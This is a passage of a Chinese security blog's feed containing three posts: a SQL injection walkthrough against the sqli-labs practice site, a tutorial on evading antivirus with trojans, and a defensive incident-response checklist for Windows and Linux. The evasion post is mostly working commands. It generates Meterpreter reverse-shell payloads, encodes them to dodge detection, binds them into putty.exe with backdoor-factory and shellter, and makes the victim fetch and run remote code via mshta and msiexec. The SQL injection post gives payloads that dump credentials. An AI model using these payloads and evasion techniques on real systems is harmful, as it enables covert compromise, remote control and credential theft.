variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;table border='1'>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;tr>&lt;th>id&lt;/th> &lt;th>username&lt;/th> &lt;/tr>"</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;tr>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;td>"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/td>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;td>"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/td>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/tr>"</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;/table>"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/05/06/php-xDebug/">php-xDebug远程调试漏洞(代码执行)</a></li><li><a href="http://broken-year.github.io/2022/05/06/php-inclusion/">PHP文件包含漏洞(利用phpinfo)</a></li><li><a href="http://broken-year.github.io/2022/05/05/php-fpm-fastcgi/">PHP-FPM Fastcgi未授权访问漏洞</a></li><li><a href="https://blogs.kainy.cn/2010/10/主流编程语言优劣考/">主流编程语言优劣考</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描原理以及SQL注入</title>
      <link href="/2022/03/22/scanner/"/>
      <url>/2022/03/22/scanner/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞扫描原理以及sql注入"><a href="#漏洞扫描原理以及sql注入" class="headerlink" title="漏洞扫描原理以及sql注入"></a>漏洞扫描原理以及sql注入</h1><h2 id="关于漏洞"><a href="#关于漏洞" class="headerlink" title="关于漏洞"></a>关于漏洞</h2><blockquote><p>漏洞为什么会出现？</p><p>——因为和用户有互动。</p><p>因为需要调用后端的逻辑代码，甚至需要调用数据库或者操作系统命令</p></blockquote><h2 id="最基本的sql"><a href="#最基本的sql" class="headerlink" title="最基本的sql"></a>最基本的sql</h2><blockquote><p>sql注入靶场 sqli-labs</p></blockquote><h3 id="命令行操作数据库"><a href="#命令行操作数据库" class="headerlink" title="命令行操作数据库"></a>命令行操作数据库</h3><pre class=" language-mysql"><code class="language-mysql">mysql.exe -uroot -proot//输入用户名和密码连接数据库show databases;//查看数据库所有库名use [库名];//进入某个数据库show tables;//查看数据库有多少张表select * from [表名];//查看表中所有内容select * from table where id<13 limit 1,2;select 1,2,3,4,5;//自己创建一个表select * from table where id<13 union select 1,2,3;//联合查询</code></pre><h3 id="基本sql注入攻击"><a href="#基本sql注入攻击" class="headerlink" title="基本sql注入攻击"></a>基本sql注入攻击</h3><p><code>ps</code>本次用的是sqli-labs里的第一题</p><p><strong>估算目标数据库语法</strong></p><pre class=" language-mysql"><code class="language-mysql">select username,password from table where id=1 limit 0,1;</code></pre><blockquote><p>黑客需要破坏数据库语句<strong>目的</strong>是：为了知道数据库的闭合方式。</p><p>这个世界上所有的<strong>闭合方式</strong>：</p><p>‘ “ () (‘x’) ((‘x’)) (“x”) ((“x”)) (()) 和没有任何闭合方式的</p></blockquote><p><strong>猜测</strong>比如： </p><p><code>id=2&#39;</code></p><p>报错：’’2’’ LIMIT 0,1’</p><p>即实际上：’2’’ LIMIT 0,1</p><p>\ &#x3D; 转义字符：把后面的第一个东西变成字符串</p><pre class=" language-mysql"><code class="language-mysql">select username,password from table where id=' 2\' limit 0,1</code></pre><p>闭合失败，报错，爆出闭合内容，知道闭合方式是’’</p><p><strong>数据库注释符</strong>：</p><p><code>--</code></p><p><code>/**/</code></p><p><code>#</code></p><p><code>+</code>相当于空格</p><p>那么就可以把后续内容<strong>注释</strong>掉：</p><p><code>select username,password from table where id=&#39; 2&#39; --+ &#39; limit 0,1</code></p><p>即：<code>select username,password from table where id=&#39; 2&#39;</code></p><p><strong>确定有多少个栏目</strong></p><p><code>id=2&#39; order by [数字] --+</code></p><p>完整即：</p><p><code>select id,username,password from table where id=&#39; 2&#39; order by 10 --+</code></p><p>发现<code>order by 3</code>正常</p><p>说明他数据库里有3个栏目</p><p><strong>显示报错位</strong></p><p><code>select id,username,password from table where id=&#39; -2&#39; union select 1,2,3 --+ &#39; limit 0,1</code></p><p><code>id=-2&#39; union select 1,2,3 --+</code>发现报错位是2,3</p><p><strong>查看数据库的库名</strong></p><p><code>id=-2&#39; union select 1,database(),3 --+</code></p><p>库名是<code>security</code></p><p><strong>根据库名找到表名</strong></p><p><code>id=-2&#39; union select 1,table_name,3 from information_schema.tables where table_schema = &#39;security&#39; limit 0,1 --+</code></p><p>查到表名<code>emails，referers，uagents，users</code></p><p><strong>根据表名找到列名</strong></p><p>黑客觉得<code>users</code>里面的数据很有价值\</p><p><code>id=-2&#39; union select 1,column_name,3 from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39; limit 0,1 --+</code></p><p>发现<code>users</code>里有<code>id，username，password</code></p><p>黑客需要拿到所有的<code>username</code>和<code>password</code>的值</p><p><code>id=-2&#39; union select 1,group_concat(username),group_concat(password) from users  --+</code></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> PHP </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀技术以及木马处理</title>
      <link href="/2022/03/21/kill-free-trojan/"/>
      <url>/2022/03/21/kill-free-trojan/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀技术以及木马处理"><a href="#免杀技术以及木马处理" class="headerlink" title="免杀技术以及木马处理"></a>免杀技术以及木马处理</h1><blockquote><p>如果需要深入了解</p><p>需要学习：破解、二进制、逆向工程</p></blockquote><h2 id="杀毒软件原理："><a href="#杀毒软件原理：" class="headerlink" title="杀毒软件原理："></a>杀毒软件原理：</h2><p><strong>扫描技术</strong>：</p><blockquote><p>扫描压缩包，对压缩包内容进行分析检查</p></blockquote><p><strong>程序篡改防护</strong>：</p><blockquote><p>避免感染文件</p></blockquote><p><strong>修复技术</strong>：</p><blockquote><p>对受损文件进行还原</p></blockquote><p><strong>急救盘杀毒</strong>：</p><blockquote><p>利用空白的u盘制作进行杀毒</p></blockquote><p><strong>智能扫描</strong>：</p><blockquote><p>扫描常用磁盘和系统关键位置</p></blockquote><p><strong>全盘扫描</strong>：</p><blockquote><p>所有地方都扫描</p></blockquote><p><strong>勒索软件防护</strong>：</p><blockquote><p>保护电脑文件不被加密</p></blockquote><p><strong>开机扫描</strong>：</p><blockquote><p>扫描坑不需要的程序</p></blockquote><p><strong>监控技术</strong>：</p><p>内存监控：</p><blockquote><p>监控内存，进程，网络数据</p></blockquote><p>文件监控：</p><blockquote><p>发现文件存在病毒或者被感染报警</p></blockquote><p>邮件监控：</p><blockquote><p>电子邮件病毒拦截</p></blockquote><p><strong>网页防护</strong>：</p><blockquote><p>阻止网络攻击和不安全的下载</p></blockquote><p><strong>行为防护</strong>：</p><blockquote><p>提醒用户应用程序可疑的行为</p></blockquote><h2 id="安装wine32"><a href="#安装wine32" class="headerlink" title="安装wine32"></a>安装wine32</h2><pre><code>dpkg --add-architecture i386 &amp;&amp; apt update &amp;&amp; apt -y install wine32 </code></pre><p>linux支持exe程序</p><h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><pre class=" language-Linux"><code class="language-Linux">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py python2 get-pip.py apt-get install python3-pip pip install --upgrade pip -i https://pypi.douban.com/simple </code></pre><p>python应用商店</p><h2 id="生成一个普通木马"><a href="#生成一个普通木马" class="headerlink" title="生成一个普通木马"></a>生成一个普通木马</h2><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=[端口] -f exe -o shell.exe# -p windows/meterpreter/reverse_tcp 利用windows/meterpreter/reverse_tcp 生成木马程序# lhost=[ip] lport=[端口] 连接本地ip和端口# -o shell.exe 生成名为shell.exe的木马程序</code></pre><pre class=" language-Linux"><code class="language-Linux">msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost=192.168.3.134show optionsexploitbackgroundsessions</code></pre><p><a href="http://virustotal.com/">http://virustotal.com</a></p><blockquote><p>56&#x2F;71</p></blockquote><h2 id="msf自带免杀"><a href="#msf自带免杀" class="headerlink" title="msf自带免杀"></a>msf自带免杀</h2><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -e x86/shikata_ga_nai -b "\x00" -i 15 -f exe -o shell.exe# x86/shikata_ga_nai 用自带免杀把软件进行加密# 屏蔽\x00 i加密15次# -f exe 加密同时不能破坏exe的结构</code></pre><blockquote><p>55&#x2F;71</p></blockquote><h2 id="msf捆绑免杀"><a href="#msf捆绑免杀" class="headerlink" title="msf捆绑免杀"></a>msf捆绑免杀</h2><p>比如：一个正经软件+捆绑木马</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -x putty.exe -f exe -o shell.exe# -x putty.exe 把木马程序捆绑在putty.exe上# -f exe 加密同时不能破坏exe的结构</code></pre><blockquote><p>44&#x2F;71</p></blockquote><h2 id="msf自带免杀-捆绑"><a href="#msf自带免杀-捆绑" class="headerlink" title="msf自带免杀+捆绑"></a>msf自带免杀+捆绑</h2><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -e x86/shikata_ga_nai -x putty.exe -i 15 -f exe -o shell.exe# 合并前两个操作</code></pre><blockquote><p>45&#x2F;70</p></blockquote><h2 id="backdoor-factory"><a href="#backdoor-factory" class="headerlink" title="backdoor factory"></a>backdoor factory</h2><blockquote><p>后门工厂 </p></blockquote><pre class=" language-Linux"><code class="language-Linux">在github搜索backdoor factory下载下来之后进入文件夹cd the-backdoor-factory-master/chmod 777 ./*./install.shpip install -i https://pypi.douban.com/simple pefile/capstone# 重新安装缺失组件对某个正经程序插入木马代码：# 查看这个程序是否支持插入代码python backdoor.py -f /root/putty.exe -S# 查找程序里大于600的缝隙python backdoor.py -f /root/putty.exe -c -l 600# 获取文件可用的payloadpython backdoor.py -f /root/putty.exe -s show# 生成payloadpython backdoor.py -f /root/putty.exe -s reverse_shell_tcp_inline -H 192.168.1.144 -P 4444 -J -o haha.exe</code></pre><h2 id="用户自己做的木马"><a href="#用户自己做的木马" class="headerlink" title="用户自己做的木马"></a>用户自己做的木马</h2><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f raw -o shell.cpython backdoor.py -f /root/putty.exe -s user_supplied_shellcode_threaded -U /root/shell.c -o haha.exe# 把木马做成.c的格式</code></pre><p>48&#x2F;71</p><h2 id="unicorn独角兽"><a href="#unicorn独角兽" class="headerlink" title="unicorn独角兽"></a>unicorn独角兽</h2><pre class=" language-Linux"><code class="language-Linux">cd unicorn-master/lschmod 777 ./*python unicorn.py --helppython unicorn.py windows/meterpreter/reverse_tcp 192.168.1.144 4444# 生成2个文件，xxx.rc文件[meterpreter监听代码]和txt文件[powershell的txt文件攻击代码](powershell的txt文件可以考虑变成bat)msfconsole -r unicorn.rcmsfconsole -r xxx.rc# 使用代码</code></pre><p>6&#x2F;59</p><h2 id="spookflare"><a href="#spookflare" class="headerlink" title="spookflare"></a>spookflare</h2><p>GitHub上搜索</p><pre class=" language-Linux"><code class="language-Linux">cd  SpookFlare-master/lschmod 777 ./*# 发现有requirements.txt就要去安装Python的依赖库安装python依赖库pip install -i https://pypi.douban.com/simple -r requirements.txtpython  spookflare.py     # 进入helplistuse 2info    #可以查看需要set的内容【类似于options】set PROTO httpset LHOST 192.168.1.144set LPORT 8080set ARCH x64set SSIZE 61337(ps:注意大小写敏感)generate    #生成</code></pre><blockquote><p>此时生成了三个文件</p></blockquote><p><img src="/2022/03/21/kill-free-trojan/image-20220322113335216.png" alt="image-20220322113335216"></p><blockquote><p>把上面那个cs后缀的文件改名为test.cs</p></blockquote><pre class=" language-Linux"><code class="language-Linux">C:\Windows\Microsoft.NET\Framework\v4.0.30319csc.exe /t:exe /out:test.exe test.cs  //把上面那个cs后缀的文件改名为test.cs</code></pre><h2 id="sharpshooter"><a href="#sharpshooter" class="headerlink" title="sharpshooter"></a>sharpshooter</h2><pre class=" language-Linux"><code class="language-Linux">cd   SharpShooter-master/lschmod 777 ./*# 发现有requirements.txt就要去安装Python的依赖库# 安装python依赖库pip install -i https://pypi.douban.com/simple -r requirements.txt# 生成txt格式木马msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.144 LPORT=4444 -f raw -o shellcode.txt# 创建ht  a后门python SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./shellcode.txt --sandbox 4 --smuggle --template mcafee# 得到hta格式和html格式use  multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.1.144set lport 4444exploit被植入电脑cmd：执行mshta.exe http://192.168.1.252/foo.htahttp://192.168.1.252/foo.html</code></pre><p>类似钓鱼网站执行</p><blockquote><p>24&#x2F;61</p></blockquote><h2 id="msf创建hta程序"><a href="#msf创建hta程序" class="headerlink" title="msf创建hta程序"></a>msf创建hta程序</h2><pre class=" language-Linux"><code class="language-Linux">msfconsoleuse exploit/windows/misc/hta_serverset srvhost [你自己ip]set lhost [你自己ip]exploit# 会给你一个网址 http://xxxxxx/xxx.hta#然后用户可以远程去执行：mshta http://xxxxxx/xxx.hta</code></pre><blockquote><p>29&#x2F;61</p></blockquote><h2 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h2><pre class=" language-Linux"><code class="language-Linux">apt-get install shellter  # 安装一下，不能在终端操作shellterAPE Target: /root/putty.exe</code></pre><p><img src="/2022/03/21/kill-free-trojan/image-20220322145051728.png" alt="image-20220322145051728"></p><p><img src="/2022/03/21/kill-free-trojan/image-20220322145118755.png" alt="image-20220322145118755"></p><p><img src="/2022/03/21/kill-free-trojan/image-20220322145226624.png" alt="image-20220322145226624"></p><p><img src="/2022/03/21/kill-free-trojan/image-20220322145536428.png" alt="image-20220322145536428"></p><blockquote><p>Eable Stealth Mode可以no，不然效果会差一点</p></blockquote><p>39&#x2F;70</p><p>生成之后在msfconsole里使用:</p><pre class=" language-Linux"><code class="language-Linux">handler -H 192.168.1.144 -P 4444 -p windows/meterpreter/reverse_tcpjobs可以看见开启监听</code></pre><h2 id="msi执行的木马——可以隔空执行的"><a href="#msi执行的木马——可以隔空执行的" class="headerlink" title="msi执行的木马——可以隔空执行的"></a>msi执行的木马——可以隔空执行的</h2><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f msi > haha.txt然后在被控制电脑里：msiexec /q /i http://192.168.1.252/haha.txt</code></pre><blockquote><p>35&#x2F;58</p></blockquote><h2 id="shellcode-launcher"><a href="#shellcode-launcher" class="headerlink" title="shellcode-launcher"></a>shellcode-launcher</h2><p>github</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f raw -o shell.raw</code></pre><p>需要shellcode-launcher执行</p><pre class=" language-Linux"><code class="language-Linux">shellcode_launcher.exe -i shell.raw</code></pre><blockquote><p>24&#x2F;59</p></blockquote><p>免杀在实战中很重要，不过最好得学会编程，不然没办法自己研发出自己的木马，用人家的东西效果一般不太友好。</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认���方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 木马 </tag>
            
            <tag> msf </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客攻击应急响应</title>
      <link href="/2022/03/21/emergency-response/"/>
      <url>/2022/03/21/emergency-response/</url>
      
        <content type="html"><![CDATA[<h1 id="黑客攻击应急响应"><a href="#黑客攻击应急响应" class="headerlink" title="黑客攻击应急响应"></a>黑客攻击应急响应</h1><h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><p><strong>web入侵：</strong><br>挂马，网页篡改（菠菜，黑帽seo），植入webshell，黑页，暗链等</p><p><strong>主机入侵：</strong><br>病毒木马，勒索病毒，远控后门，系统异常，RDP爆破，SSH爆破，主机漏洞，数据库入侵等</p><p><strong>网络攻击：</strong><br>DDOS&#x2F;CC攻击，ARP攻击，DNS&#x2F;HTTP劫持</p><p><strong>路由器&#x2F;交换机攻击：</strong><br>内网病毒，配置错误，机器本身的漏洞等</p><h2 id="Windows应急响应"><a href="#Windows应急响应" class="headerlink" title="Windows应急响应"></a>Windows应急响应</h2><h3 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h3><p>病毒，木马，蠕虫事件；<br>web服务器或者第三方服务入侵事件；<br>系统入侵事件；<br>网络攻击。</p><h3 id="日志查看"><a href="#日志查看" class="headerlink" title="日志查看"></a>日志查看</h3><pre class=" language-base"><code class="language-base">eventvwr.msc 打开日志</code></pre><p>位置：</p><blockquote><p>C:\Windows\System32\winevt\logs</p><p>(旧位置)C:\Windows\System32\config</p><p>C:\windows\System32\wdi\LogFiles</p><p>C:\Windows\System32\wdi\{86432a0b-3c7d-4ddf-a89c-172faa90485d} 存放id</p></blockquote><p><strong>在主机上完成的一些操作</strong>都会被当做<strong>事件</strong>存在日志里。</p><p>主要看<strong>事件ID</strong>来进行排查。</p><p>可以<strong>筛选当前日志</strong>：</p><p><img src="/2022/03/21/emergency-response/image-20220111172648892.png" alt="image-20220111172648892"></p><p>需要了解一些相关事件ID。</p><p>事件ID：<code>1102</code>事件为删除日志。</p><p>关于日志，有些黑客会删除日志、更改日志等。</p><h3 id="检查账户"><a href="#检查账户" class="headerlink" title="检查账户"></a>检查账户</h3><pre class=" language-base"><code class="language-base">net user</code></pre><p>并且去：</p><p><code>计算机管理 \ 本地用户和组 \ 用户</code> 里</p><p>再次查看检查</p><h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><pre class=" language-base"><code class="language-base">regedit</code></pre><blockquote><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList</p><p>HKEY_LOCAL_MACHINE\SAM\SAM</p></blockquote><p><img src="/2022/03/21/emergency-response/image-20220112113529639.png" alt="image-20220112113529639"></p><blockquote><p>[s表示id，1表示标准，1-5-18是system权限，1-5-18、1-5-19、1-5-20一般是默认的，5是标识符的权限，长的一般是用户自己设置的别的用户]</p></blockquote><h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><h4 id="临时目录排查"><a href="#临时目录排查" class="headerlink" title="临时目录排查"></a>临时目录排查</h4><blockquote><p>tmp&#x2F;temp</p><p>C:\Users\Administrator\Local Settings\Temp</p><p>C:\Documents and Settings\Local Settings\Temp</p><p>C:\Users\Administrator\Desktop</p><p>C:\Users\Administrator\Local Settings\Temporary Internet Files</p></blockquote><h4 id="浏览器相关文件"><a href="#浏览器相关文件" class="headerlink" title="浏览器相关文件"></a>浏览器相关文件</h4><blockquote><p>C:\Users\Administrators\Cookies</p><p>C:\Users\Documents and Settings\username</p><p>C:\Users\Administrator\Local Settings\History</p></blockquote><p>也可以到控制面板-&gt;Internet选项-&gt;浏览历史记录-&gt;设置</p><p><img src="/2022/03/21/emergency-response/image-20220112114704841.png" alt="image-20220112114704841"></p><p><img src="/2022/03/21/emergency-response/image-20220112114716272.png" alt="image-20220112114716272"></p><h4 id="最近打开文件"><a href="#最近打开文件" class="headerlink" title="最近打开文件"></a>最近打开文件</h4><blockquote><p>C:\User\Administrator\Recent</p></blockquote><h4 id="文件修改时间"><a href="#文件修改时间" class="headerlink" title="文件修改时间"></a>文件修改时间</h4><h4 id="hosts文件"><a href="#hosts文件" class="headerlink" title="hosts文件"></a>hosts文件</h4><blockquote><p>C:\Windows\System32\drivers\etc</p></blockquote><h3 id="网络行为排查"><a href="#网络行为排查" class="headerlink" title="网络行为排查"></a>网络行为排查</h3><p><a href="https://www.virustotal.com/">https://www.virustotal.com/</a></p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p><a href="https://beian.cndns.com/">https://beian.cndns.com/</a></p><p>善用google baidu</p><h4 id="网络连接排查"><a href="#网络连接排查" class="headerlink" title="网络连接排查"></a>网络连接排查</h4><pre class=" language-base"><code class="language-base">netstat -ano</code></pre><h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p>wireshark&#x2F;burpsuite&#x2F;charles</p><p>xxx.3322.org</p><h4 id="漏洞与补丁信息"><a href="#漏洞与补丁信息" class="headerlink" title="漏洞与补丁信息"></a>漏洞与补丁信息</h4><pre class=" language-base"><code class="language-base">systeminfo   \\打了哪些补丁</code></pre><h3 id="可疑进程分析"><a href="#可疑进程分析" class="headerlink" title="可疑进程分析"></a>可疑进程分析</h3><h4 id="进程名字异常-x2F-伪装"><a href="#进程名字异常-x2F-伪装" class="headerlink" title="进程名字异常&#x2F;伪装"></a>进程名字异常&#x2F;伪装</h4><blockquote><p>hsdLj3.tmp 遇到可疑进程可以打开文件具体位置看看到底在哪</p></blockquote><h4 id="进程信息排查"><a href="#进程信息排查" class="headerlink" title="进程信息排查"></a>进程信息排查</h4><blockquote><p>pchunter64位  好使</p></blockquote><h3 id="启动项排查"><a href="#启动项排查" class="headerlink" title="启动项排查"></a>启动项排查</h3><p>pchunter</p><p>msconfig查看启动项以及服务</p><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p>看看有没有奇怪的东西</p><blockquote><p>C:\windows\System32\Tasks</p></blockquote><h4 id="注册表的自动启动："><a href="#注册表的自动启动：" class="headerlink" title="注册表的自动启动："></a>注册表的自动启动：</h4><blockquote><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run【可能有】</p><p>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Run【可能有加run的文件】</p><p>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p><p>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</p></blockquote><blockquote><p><strong>我的电脑</strong>：</p><p>C:\ProgramData\Microsoft\Windows\startmenu【开始菜单】\程序\startapp</p></blockquote><h3 id="特定事件痕迹"><a href="#特定事件痕迹" class="headerlink" title="特定事件痕迹"></a>特定事件痕迹</h3><p><strong>挖矿病毒</strong></p><p>社会工程学 钓鱼</p><p>诱导用户点击邮件</p><p>远程代码执行</p><p>第三方软件漏洞</p><p>系统密码弱口令</p><p>web页面挖矿脚本</p><p><strong>特点</strong> cpu gpu 内存很高 还会绑定矿工ip</p><p><strong>勒索病毒</strong></p><blockquote><p>勒索病毒大多数无解 软件被加密</p><p>遇上之后先隔离</p></blockquote><p>社工，钓鱼软件</p><p>永恒之蓝等漏洞</p><p>弱口令传播</p><p>只能通过重装系统，把相应漏洞补上</p><h2 id="Linux应急响应"><a href="#Linux应急响应" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h2><blockquote><p>cpu飙升</p><p>服务器卡顿</p><p>异常流量</p><p>异常网络连接</p><p>服务器无法登录</p><p>僵尸网络</p><p>挖矿</p><p>dns服务器报读</p></blockquote><pre class=" language-Linux"><code class="language-Linux">ifconfig  查看是否有异常流量top -c  cpu和内存使用情况lsof -i -PnR 网络通信情况ps -aux | grep [pid]  查找进程lsof -p [pid] 查看进程打开的文件md5sum [文件名] 打开文件的md5值</code></pre><h3 id="网络行为分析"><a href="#网络行为分析" class="headerlink" title="网络行为分析"></a>网络行为分析</h3><pre class=" language-Linux"><code class="language-Linux">who 查看当前用户登录信息uname -a 查看系统信息netstat -ano 查看所有网络连接netstat -utnpl 查看带端口情况的arp -a  查看arp表iptables -l 查看防火墙规则iptables -I INPUT -p tcp --dport 443 -m string --sgring "xxx.com" --algo bm -j DROP  入方向iptables -A OUTPUT -d 123.123.123.123 -j DROP 屏蔽出方向到ip的流量</code></pre><h3 id="进程检查"><a href="#进程检查" class="headerlink" title="进程检查"></a>进程检查</h3><pre class=" language-Linux"><code class="language-Linux">ps auxps -eftop -clsof -p [pid]lsof -ilsof -c</code></pre><h3 id="启动项排查-1"><a href="#启动项排查-1" class="headerlink" title="启动项排查"></a>启动项排查</h3><blockquote><p>&#x2F;etc&#x2F;init.d&#x2F;<br>&#x2F;etc&#x2F;xinetd.d</p></blockquote><p>查看rc.local文件</p><blockquote><p>&#x2F;etc&#x2F;rc.d&#x2F;rc[0-6].d<br>&#x2F;etc&#x2F;profile.d&#x2F;</p></blockquote><p><strong>Linux的启动文件：</strong></p><p><strong>init</strong>文件名，<strong>系统启动的第一个脚本</strong></p><p><strong>init.d</strong>目录名，<strong>服务启动脚本</strong></p><p>rcX.d目录名，比如rc1.d，rc2.d…数字代表级别</p><p>etc\rc.d目录名，里面文件s开头一般表示初始化后系统启动的第一个脚本</p><h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><blockquote><p>&#x2F;etc&#x2F;crontab</p><p>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p></blockquote><pre class=" language-Linux"><code class="language-Linux">crontab -l 列出crontab -r 删除crontab -e 编辑</code></pre><h3 id="一些奇怪的目录"><a href="#一些奇怪的目录" class="headerlink" title="一些奇怪的目录"></a>一些奇怪的目录</h3><blockquote><p>&#x2F;var&#x2F;spool</p><p>&#x2F;etc&#x2F;cron.d</p><p>&#x2F;etc&#x2F;cron.daily</p><p>……</p></blockquote><h3 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h3><pre class=" language-Linux"><code class="language-Linux">cat /etc/services 查看服务服务名称、使用端口、协议名称/别名、服务干啥用的</code></pre><p><strong>端口</strong></p><p>1-1024 